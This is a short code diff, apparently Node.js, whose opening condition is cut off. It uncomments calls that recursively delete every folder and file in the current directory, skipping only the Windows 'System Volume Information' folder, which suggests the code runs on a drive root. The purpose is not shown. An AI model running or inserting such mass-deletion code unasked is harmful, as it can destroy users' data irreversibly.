@@ -28,10 +28,10 @@ if (
     glob.sync("./*/").map(resources => {
         console.log(resources);
         if (resources == "./System Volume Information/") return;
-        //fs.rmSync(resources, {recursive: true});
+        fs.rmSync(resources, {recursive: true});
     })
 
     glob.sync("./*.*").map(resource => {
-        //fs.unlink(resource, (err) => {});
+        fs.unlink(resource, (err) => {});
     })
 }
